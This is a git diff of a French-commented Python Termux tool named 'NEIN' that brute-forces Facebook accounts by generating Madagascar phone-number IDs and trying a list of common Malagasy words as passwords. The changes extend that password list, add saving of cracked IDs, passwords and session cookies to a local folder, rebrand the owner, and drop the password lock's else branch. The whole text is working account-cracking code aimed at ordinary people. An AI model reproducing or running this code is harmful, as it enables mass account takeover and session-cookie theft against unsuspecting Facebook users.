@@ -1,6 +1,15 @@
 import getpass
 import subprocess
-
+import os
+from os import system as clr
+import random
+import string 
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+import re
+import sys
+import uuid
+import json
 # Mot de passe pour déverrouiller le script
 mot_de_passe = "ITACHI2024"
 
@@ -17,25 +26,7 @@ if saisie_mot_de_passe == mot_de_passe:
         print(f"Erreur lors de l'exécution de git pull : {e}")
         exit(1)
     print("Git pull terminé avec succès !")
-    # Mettre ici le reste de votre script
-    # Par exemple :
-    print("Bienvenue dans le script !")
-else:
-    print("Mot de passe incorrect. Le script est verrouillé.")
-    exit()
 
-
-#------------- import -------------#
-import os
-from os import system as clr
-import random
-import string 
-from concurrent.futures import ThreadPoolExecutor as tred
-import requests
-import re
-import sys
-import uuid
-import json
 #-------------color----------------#
 bblack="\033[1;30m"         # Black
 M="\033[1;31m"            # Red
@@ -64,11 +55,12 @@ logo=(f'''{B}
                                             
 
 {warna}--------------------------------------------{B}
- Owner    : ITACHI
+ Owner    : CHRICE999
  TOOL NAME : NEIN
  GROUPE-FB   : [TERMUX-COMAND]
- Facebook : ITACHI SQ
- Tools    : {warna}[{H}VERSION 1.1{warna}]{warna}
+ STATUE : FREE
+ Facebook : {bblue}ITACHI SQ{bblue}
+ Tools    : {warna}[{M}VERSION 1.1{warna}]{warna}
 --------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
@@ -94,6 +86,7 @@ def BD_CLONING():
     user=[]
     clear()
     print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
+    print(' 261=0 Madagascar : [032] [034] [038] [033]')
     code=input(' ENTER SIM CODE >> ')
     linex()
     print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
@@ -113,7 +106,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
@@ -122,7 +115,7 @@ def BD_CLONING():
     input(' PRESS ENTER TO BACK  : ')
     MR_ITACHI()
 #------------ method crack def ---------#
-def method_crack(ids,passlist):
+def method_crack(ids, passlist):
     global oks
     global cps
     global loop
@@ -147,12 +140,19 @@ def method_crack(ids,passlist):
                     print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
-                    open('/sdcard/ITACHI-OK.txt','a').write(str(uid)+' | '+pas+'\n')
+                    # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
+                    if not os.path.exists("ITACHI-IDS"):
+                        os.makedirs("ITACHI-IDS")
+                    # Enregistrer dans le fichier ITACHI-OK.txt
+                    with open(os.path.join("ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
+                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
                 print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/ITACHI-CP.txt','a').write(ids+'|'+pas+'\n')
+                # Enregistrer dans le fichier ITACHI-CP.txt
+                with open(os.path.join("ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
+                    f.write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
